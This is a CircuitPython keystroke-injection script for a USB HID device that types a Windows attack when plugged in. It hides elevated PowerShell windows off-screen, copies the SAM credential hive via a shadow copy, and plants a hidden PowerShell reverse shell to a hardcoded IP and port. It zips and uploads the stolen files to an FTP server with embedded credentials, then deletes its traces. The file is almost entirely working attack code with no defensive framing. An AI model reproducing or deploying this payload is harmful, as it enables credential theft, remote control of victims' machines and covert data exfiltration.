import time
import board
import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
from adafruit_hid.keycode import Keycode as k
from digitalio import DigitalInOut, Direction, Pull
### Conf ###
delay = (.8)
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayoutUS(kbd)
### Vars ###
ip_addr = "10.10.10.10"
port = "6969"
ftp_addr = "ftp://lab:fr33F1lz@dev00ps.com"



### Scripts ###
time.sleep(delay)
kbd.press(k.LEFT_GUI, k.R)
keyboard.release_all()
layout.write("powershell Start-Process notepad -Verb runAs\n")
kbd.press(k.LEFT_ALT, k.Y)
keyboard.release_all()
kbd.press(k.LEFT_ALT, SPACEBAR)
keyboard.release_all()
layout.write("m\n")
for i in range(100):
	kbd.press(k.DOWN_ARROW)
	keyboard.release_all()


layout.write("$folderDateTime = (get-date).ToString('d-M-y HHmmss')\n")
layout.write("$userDir = (Get-ChildItem env:\\userprofile).value + '\\Ducky Report ' + $folderDateTime\n")
layout.write("$fileSaveDir = New-Item  ($userDir) -ItemType Directory\n")
layout.write("$date = get-date\n")
layout.write("$style = \"<style> table td{padding-right: 10px;text-align: left;}#body {padding:50px;font-family: Helvetica; font-size: 12pt; border: 10px solid black;background-color:white;height:100%;overflow:auto;}#left{float:left; background-color:#C0C0C0;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#right{background-color:#C0C0C0;float:right;width:45%;height:260px;border: 4px solid black;padding:10px;margin:10px;overflow:scroll;}#c{background-color:#C0C0C0;width:98%;height:300px;border: 4px solid black;padding:10px;overflow:scroll;margin:10px;} </style>\"\n")
layout.write("$Report = ConvertTo-Html -Title 'Recon Report' -Head $style > $fileSaveDir'/ComputerInfo.html'\n")
layout.write("$Report = $Report + \"<div id=body><h1>Duck Tool Kit Report</h1><hr size=2><br><h3> Generated on: $Date </h3><br>\"\n") 
layout.write("$createShadow = (gwmi -List Win32_ShadowCopy).Create('C:\', 'ClientAccessible')\n")
layout.write("$shadow = gwmi Win32_ShadowCopy | ? { $_.ID -eq $createShadow.ShadowID } \n")
layout.write("$addSlash  = $shadow.DeviceObject + '\' \n")
layout.write("cmd /c mklink C:\\shadowcopy $addSlash\n")
layout.write("Copy-Item 'C:\\shadowcopy\\Windows\\System32\\config\\SAM' $fileSaveDir\n")
layout.write("Remove-Item -recurse -force 'C:\\shadowcopy'\n")
layout.write("Add-Content \"$env:TEMP\11813.ps1\" '$c = New-Object System.Net.Sockets.TCPClient(\""+ip_addr+"\","+port+");$s = $c.GetStream();[byte[]]$b = 0..255|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-\n")
layout.write(");$sb2  = $sb + \"PS \" + (pwd).Path + \"> \";$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()'\n")
layout.write("start-Process powershell.exe -windowstyle hidden \"$env:TEMP\11813.ps1\"\n")



layout.write("$Report >> $fileSaveDir'/ComputerInfo.html'\n") 
layout.write("function copy-ToZip($fileSaveDir){ \n")
layout.write("$srcdir = $fileSaveDir \n")
layout.write("$zipFile = 'C:\\Windows\\Report.zip'\n")
layout.write("if(-not (test-path($zipFile))) { \n")
layout.write("set-content $zipFile (\"PK\" + [char]5 + [char]6 + (\"$([char]0)\" * 18))\n")
layout.write("(dir $zipFile).IsReadOnly = $false} \n")
layout.write("$shellApplication = new-object -com shell.application\n") 
layout.write("$zipPackage = $shellApplication.NameSpace($zipFile) \n")
layout.write("$files = Get-ChildItem -Path $srcdir \n")
layout.write("foreach($file in $files) { \n")
layout.write("$zipPackage.CopyHere($file.FullName)\n") 
layout.write("while($zipPackage.Items().Item($file.name) -eq $null){\n") 
layout.write("Start-sleep -seconds 1 }}} \n")
layout.write("copy-ToZip($fileSaveDir) \n")
layout.write("$final = 'C:\\Windows\\Report.zip'\n")
layout.write("$ftpAddr = \""+ftp_addr+"/Report.zip\"\n")
layout.write("$browser = New-Object System.Net.WebClient\n")  
layout.write("$url = New-Object System.Uri($ftpAddr)  \n")
layout.write("$browser.UploadFile($url, $final)  \n")
layout.write("remove-item $fileSaveDir -recurse \n")
layout.write("remove-item 'C:\\Windows\\Report.zip'\n")
layout.write("Remove-Item $MyINvocation.InvocationName\n") 
kbd.press(k.CONTROL, k.S)
keyboard.release_all()
layout.write("C:\\Windows\\config-11813.ps1\n") 
kbd.press(k.LEFT_ALT, F4)
keyboard.release_all()
kbd.press(k.LEFT_GUI, k.R)
keyboard.release_all() 
layout.write("powershell Start-Process cmd -Verb runAs \n")  
kbd.press(k.LEFT_ALT, k.Y)
keyboard.release_all()
layout.write("mode con:cols=14 lines=1 \n") 
kbd.press(k.LEFT_ALT, SPACEBAR)
keyboard.release_all() 
layout.write("m \n") 
for i in range(100):
	kbd.press(k.DOWN_ARROW)
	keyboard.release_all()
layout.write("powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false \n")  
layout.write("powershell.exe -windowstyle hidden -File C:\\Windows\\config-11813.ps1\n") 
